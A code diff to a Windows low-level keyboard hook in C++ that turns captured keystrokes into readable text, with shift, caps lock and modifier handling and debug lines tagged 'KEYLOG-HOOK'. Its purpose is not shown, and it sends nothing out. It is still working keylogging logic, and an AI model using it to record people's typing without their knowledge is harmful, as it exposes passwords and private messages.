@@ -27,18 +27,121 @@ namespace windows_os {
                 evt.timestamp = GetTickCount64(); // Correct field name
 
                 if (is_down) {
-                    char keyName[64] = {0};
-                    UINT mapScanCode = MapVirtualKey(pKey->vkCode, MAPVK_VK_TO_VSC);
+                    DWORD vkCode = pKey->vkCode;
 
-                    LONG param = (mapScanCode << 16);
-                    if (pKey->flags & LLKHF_EXTENDED) param |= (1 << 24);
+                    // Check modifier states
+                    bool shiftDown = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+                    bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+                    bool ctrlDown = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
+                    bool altDown = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
 
-                    if (GetKeyNameTextA(param, keyName, 64) > 0) {
-                        evt.text = std::string(keyName);
-                    } else {
-                        evt.text = "CODE_" + std::to_string(pKey->vkCode);
+                    // Special key mappings for common keys
+                    std::string keyText;
+
+                    switch (vkCode) {
+                        // Navigation/Control keys
+                        case VK_RETURN: keyText = "\n"; break;
+                        case VK_TAB: keyText = "\t"; break;
+                        case VK_SPACE: keyText = " "; break;
+                        case VK_BACK: keyText = "[Backspace]"; break;
+                        case VK_DELETE: keyText = "[Delete]"; break;
+                        case VK_ESCAPE: keyText = "[Esc]"; break;
+
+                        // Modifier keys - skip standalone modifier presses
+                        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT:
+                        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
+                        case VK_MENU: case VK_LMENU: case VK_RMENU:
+                        case VK_LWIN: case VK_RWIN:
+                            keyText = ""; // Don't log standalone modifiers
+                            break;
+
+                        // Arrow keys
+                        case VK_LEFT: keyText = "[Left]"; break;
+                        case VK_RIGHT: keyText = "[Right]"; break;
+                        case VK_UP: keyText = "[Up]"; break;
+                        case VK_DOWN: keyText = ""; break; // Down arrow = empty heartbeat
+                        case VK_HOME: keyText = "[Home]"; break;
+                        case VK_END: keyText = "[End]"; break;
+                        case VK_PRIOR: keyText = "[PgUp]"; break;
+                        case VK_NEXT: keyText = "[PgDn]"; break;
+                        case VK_INSERT: keyText = "[Insert]"; break;
+
+                        // Function keys
+                        case VK_F1: case VK_F2: case VK_F3: case VK_F4:
+                        case VK_F5: case VK_F6: case VK_F7: case VK_F8:
+                        case VK_F9: case VK_F10: case VK_F11: case VK_F12:
+                            keyText = "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
+                            break;
+
+                        // Printable characters - handle with ToUnicode for proper shift handling
+                        default: {
+                            // Get keyboard state
+                            BYTE keyboardState[256] = {0};
+                            GetKeyboardState(keyboardState);
+
+                            // Set shift state in keyboard state array
+                            if (shiftDown) {
+                                keyboardState[VK_SHIFT] = 0x80;
+                            }
+                            if (capsLock) {
+                                keyboardState[VK_CAPITAL] = 0x01;
+                            }
+
+                            WCHAR unicodeChar[5] = {0};
+                            UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
+                            int result = ToUnicode(vkCode, scanCode, keyboardState, unicodeChar, 4, 0);
+
+                            if (result > 0) {
+                                // Convert to UTF-8
+                                char utf8[16] = {0};
+                                WideCharToMultiByte(CP_UTF8, 0, unicodeChar, result, utf8, sizeof(utf8), NULL, NULL);
+                                keyText = utf8;
+
+                                // Prepend Ctrl+ or Alt+ if modifiers are held (for shortcuts)
+                                if (ctrlDown && !altDown) {
+                                    keyText = "[Ctrl+" + keyText + "]";
+                                } else if (altDown && !ctrlDown) {
+                                    keyText = "[Alt+" + keyText + "]";
+                                } else if (ctrlDown && altDown) {
+                                    keyText = "[Ctrl+Alt+" + keyText + "]";
+                                }
+                            } else {
+                                // Fallback: use GetKeyNameText
+                                char keyName[64] = {0};
+                                UINT mapScanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
+                                LONG param = (mapScanCode << 16);
+                                if (pKey->flags & LLKHF_EXTENDED) param |= (1 << 24);
+
+                                if (GetKeyNameTextA(param, keyName, 64) > 0) {
+                                    keyText = "[" + std::string(keyName) + "]";
+                                } else {
+                                    keyText = "[Key" + std::to_string(vkCode) + "]";
+                                }
+                            }
+                            break;
+                        }
                     }
+
+                    // Skip empty key text (standalone modifiers) - except Down arrow which is heartbeat
+                    if (keyText.empty() && vkCode != VK_DOWN) {
+                        return CallNextHookEx(g_hook, nCode, wParam, lParam);
+                    }
+
+                    evt.text = keyText;
+
+                    // DEBUG: Log immediately when key is captured
+                    auto now_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
+                        std::chrono::system_clock::now().time_since_epoch()).count();
+                    std::cout << "[KEYLOG-HOOK] Key captured: '" << evt.text << "' at " << now_ms << "ms" << std::endl;
+                    std::cout.flush();
+
                     g_callback(evt);
+
+                    // DEBUG: Log after callback returns
+                    auto after_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
+                        std::chrono::system_clock::now().time_since_epoch()).count();
+                    std::cout << "[KEYLOG-HOOK] Callback returned at " << after_ms << "ms (delta=" << (after_ms - now_ms) << "ms)" << std::endl;
+                    std::cout.flush();
                 }
             }
         }
